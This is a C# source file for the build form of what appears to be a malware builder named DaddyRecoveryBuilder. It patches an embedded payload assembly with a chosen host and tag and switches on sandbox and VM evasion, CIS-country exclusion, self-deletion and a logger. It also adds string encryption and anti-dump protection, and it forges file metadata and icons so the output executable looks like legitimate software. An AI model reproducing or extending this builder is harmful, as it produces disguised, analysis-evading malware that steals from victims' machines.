namespace DaddyRecoveryBuilder.ExForms
{
    using System;
    using System.Collections.Generic;
    using System.Diagnostics;
    using System.IO;
    using System.Reflection;
    using System.Threading.Tasks;
    using System.Windows.Forms;
    using dnlib.DotNet;
    using dnlib.DotNet.Emit;
    using dnlib.DotNet.Writer;
    using Editors;
    using Helpers;
    using Injectors;
    using Properties;

    public partial class BuildFrm : UserControl
    {
        public BuildFrm()
        {
            InitializeComponent();
            string version = FileVersionInfo.GetVersionInfo(Assembly.GetExecutingAssembly().Location).FileVersion;
            VerInfoText.Text = $"Version: {version}";
        }

        private void EmptyBox_Tick(object sender, EventArgs e)
        {
            InfoViewer.Clear();
            CopyRightText.Focus();
            (sender as Timer).Stop();
        }

        private void BuildStart_Click(object sender, EventArgs e)
        {
            ActiveControl = null;
            string result = string.Empty;
            if (Collector.BuildPairs.Count == 0)
            {
                InfoViewer.Clear();
                InfoViewer.Text += "[!] Empty Collection Data\r\n";
                var time = new Timer { Interval = 5000 };
                time.Tick += EmptyBox_Tick;
                time.Enabled = true;
                return;
            }

            Task.Factory.StartNew(() =>
            {
                InfoViewer.Clear();
                InfoViewer.Text += "[^] Loading Module...\r\n";
                Task.Delay(2000);
                using var module = ModuleDefMD.Load(Resources.Daddy);

                //InfoViewer.Text += "[+] Setting the Application Output Type.. ";
                //module.Kind = BuildSettings.Output_Console ? ModuleKind.Console : ModuleKind.Windows; // Замена на консоль
                //module.Kind = BuildSettings.Output_WinForm ? ModuleKind.Windows : ModuleKind.Console; // Замена на форму
                //InfoViewer.Text += "OK\r\n";

                InfoViewer.Text += "[+] Setting the Application Output Type.. ";
                Task.Delay(2000);
                if (BuildSettings.Output_Console)
                {
                    module.Kind = ModuleKind.Console; // Замена на консоль
                    InfoViewer.Text += "Set Console OK\r\n";
                }
                if (BuildSettings.Output_WinForm)
                {
                    module.Kind = ModuleKind.Windows; // Замена на форму
                    InfoViewer.Text += "Set Winforms OK\r\n";
                }

                InfoViewer.Text += "[+] Replacing standard data with custom data... ";
                foreach (TypeDef type in module.GetTypes())
                {
                    if (type.HasMethods)
                    {
                        foreach (MethodDef m in type.Methods)
                        {
                            if (m.Name.Equals(".cctor") && m.HasBody && m.Body.HasInstructions)
                            {
                                IList<Instruction> instr = m.Body.Instructions;
                                for (int i = 0; i < instr.Count; i++)
                                {
                                    if (instr[i].Operand is FieldDef fieldCountry && fieldCountry.Name.Equals("Act_Country"))
                                    {
                                        instr[i - 1].OpCode = BuildSettings.CIS_Country ? OpCodes.Ldc_I4_1 : OpCodes.Ldc_I4_0;
                                    }
                                    if (instr[i].Operand is FieldDef fieldVirtual && fieldVirtual.Name.Equals("Act_Virtual_Machine"))
                                    {
                                        instr[i - 1].OpCode = BuildSettings.Virtual_Machine ? OpCodes.Ldc_I4_1 : OpCodes.Ldc_I4_0;
                                    }
                                    if (instr[i].Operand is FieldDef fieldSelf && fieldSelf.Name.Equals("Act_Self"))
                                    {
                                        instr[i - 1].OpCode = BuildSettings.Self_Delete ? OpCodes.Ldc_I4_1 : OpCodes.Ldc_I4_0;
                                    }
                                    if (instr[i].Operand is FieldDef fieldLogger && fieldLogger.Name.Equals("Act_LogClient"))
                                    {
                                        instr[i - 1].OpCode = BuildSettings.Active_Logger ? OpCodes.Ldc_I4_1 : OpCodes.Ldc_I4_0;
                                    }

                                    if (type.Name.Contains("Configurations") && instr[i].OpCode.Equals(OpCodes.Ldstr) && instr[i].Operand.ToString().Contains("#HOST#"))
                                    {
                                        instr[i].Operand = Collector.BuildPairs["Host"];
                                    }
                                    if (type.Name.Contains("GlobalPaths") && instr[i].OpCode == OpCodes.Ldstr && instr[i].Operand.ToString().Contains("$TAG$"))
                                    {
                                        instr[i].Operand = $"_[{Collector.BuildPairs["Tag"]}]";
                                    }
                                }
                                instr.SimplifyBranches();
                                instr.OptimizeBranches();
                                instr.OptimizeMacros();
                                instr.UpdateInstructionOffsets();
                            }
                        }
                    }
                }
                InfoViewer.Text += "OK\r\n";
                if (BuildSettings.String_Encrypt == true)
                {
                    InfoViewer.Text += "[+] Encrypting strings...";
                    StringsEditor.EncryptStrings(module);
                    InfoViewer.Text += "OK\r\n";
                }
                if (BuildSettings.Anti_Dump == true)
                {
                    InfoViewer.Text += "[+] Add AntiDump...";
                    InjectClass.InjectMethod(module, typeof(DumpEx), "Protection");
                    InfoViewer.Text += "OK\r\n";
                }

                InfoViewer.Text += "[+] Setting parameters for a module... ";
                Task.Delay(2000);
                var writerOptions = new ModuleWriterOptions(module);
                writerOptions.MetadataOptions.Flags |= MetadataFlags.KeepOldMaxStack;
                InfoViewer.Text += "OK\r\n";

                InfoViewer.Text += "[~] Saving a build file.. ";
                Task.Delay(2000);
                result = $"{GlobalPaths.CombinePath(GlobalPaths.CurrDir, Collector.BuildPairs["OutBuild"])}.exe";
                module.Write(result, writerOptions);
                InfoViewer.Text += $"{result}\r\n";

                Task.Delay(2000);

                if (File.Exists(result))
                {
                    if (BuildSettings.Assembly_Build == true && !string.IsNullOrWhiteSpace(result))
                    {
                        InfoViewer.Text += "[+] Replace file properties... ";

                        var test = new AssemblyCollector
                        {
                            ProductInfo = Collector.BuildPairs["Product"],
                            FileDescriptInfo = Collector.BuildPairs["Decription"],
                            CompanyNameInfo = Collector.BuildPairs["Company"],
                            LegalCopyrightInfo = Collector.BuildPairs["Copyright"],
                            LegalTrademarksInfo = Collector.BuildPairs["Trademask"],
                            InternalNameInfo = Collector.BuildPairs["Internal"],
                            OriginalFilenameInfo = Collector.BuildPairs["Original"],
                            ProductVersionInfo = Collector.BuildPairs["ProdVersion"],
                            FileVersionInfo = Collector.BuildPairs["FileVersion"]
                        };

                        AssTools.WriteAssembly(result, test);
                        InfoViewer.Text += "OK\r\n";
                    }
                    if (BuildSettings.Icon_Build == true)
                    {
                        // добавить проверку на изображение иконки и смену иконки через PictureBox
                        InfoViewer.Text += "[+] Add an icon for the build file... ";
                        var icon = new IconEditor();
                        icon.InjectIcon(result, Path.GetFullPath(BuildSettings.Pictures_Build), false);
                        InfoViewer.Text += "OK\r\n";
                    }
                }
                MusicPlay.Inizialize(File.Exists(result) ? Resources.GoodBuild : Resources.Error_Build);
                InfoViewer.Text += $"[^] The End\r\n";
            });
        }
    }
}